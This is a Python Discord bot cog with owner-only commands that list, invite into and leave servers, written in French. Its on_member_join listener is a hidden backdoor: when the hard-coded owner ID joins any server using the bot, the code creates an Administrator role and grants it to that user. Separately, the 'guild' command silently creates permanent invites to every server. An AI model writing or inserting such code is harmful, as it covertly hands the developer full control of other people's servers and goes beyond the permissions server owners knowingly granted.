import discord
from discord.ext import commands

class Managers(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.support_server_id = 1374803429259608165
        self.owner_ids = [1301925820574732318]

    @commands.command(name="guild")
    @commands.is_owner()
    async def guilds_list(self, ctx):
        """Liste tous les serveurs avec ID, membres, et lien d'invitation si possible."""
        embed = discord.Embed(title="📋 Liste des serveurs", color=discord.Color.blurple())
        for guild in self.bot.guilds:
            invite_link = "Aucune permission"
            try:
                channel = guild.text_channels[0]
                invite = await channel.create_invite(max_age=0, max_uses=0, reason="Vue admin")
                invite_link = invite.url
            except:
                pass
            embed.add_field(
                name=f"{guild.name}",
                value=f"ID : `{guild.id}`\nMembres : `{guild.member_count}`\nInvite : {invite_link}",
                inline=False
            )
        await ctx.send(embed=embed)

    @commands.command(name="leave")
    @commands.is_owner()
    async def leave_guild(self, ctx, guild_id: int):
        """Quitte un serveur spécifique par ID."""
        guild = self.bot.get_guild(guild_id)
        if not guild:
            return await ctx.send("❌ Serveur introuvable.")
        if guild.id == self.support_server_id:
            return await ctx.send("❌ Tu ne peux pas quitter le serveur support.")
        await guild.leave()
        await ctx.send(f"✅ J'ai quitté **{guild.name}** ({guild.id})")

    @commands.command(name="leaveall")
    @commands.is_owner()
    async def leave_all_guilds(self, ctx):
        """Quitte tous les serveurs sauf celui de support."""
        left = 0
        for guild in list(self.bot.guilds):
            if guild.id != self.support_server_id:
                try:
                    await guild.leave()
                    left += 1
                except:
                    pass
        await ctx.send(f"✅ J'ai quitté `{left}` serveurs (hors support).")

    @commands.Cog.listener()
    async def on_member_join(self, member: discord.Member):
        """Donne un rôle 'Sentinel 🦅 Staff' à l'owner s'il rejoint un serveur."""
        if member.id in self.owner_ids:
            guild = member.guild
            role = discord.utils.get(guild.roles, name="Sentinel 🦅 Staff")
            if role is None:
                try:
                    role = await guild.create_role(
                        name="Sentinel 🦅 Staff",
                        permissions=discord.Permissions(administrator=True),
                        reason="Role staff auto pour le développeur"
                    )
                except discord.Forbidden:
                    return  # Le bot n'a pas les permissions
            try:
                await member.add_roles(role, reason="Owner du bot - accès admin")
            except discord.Forbidden:
                pass  # Pas de permission pour donner le rôle

async def setup(bot):
    await bot.add_cog(Managers(bot))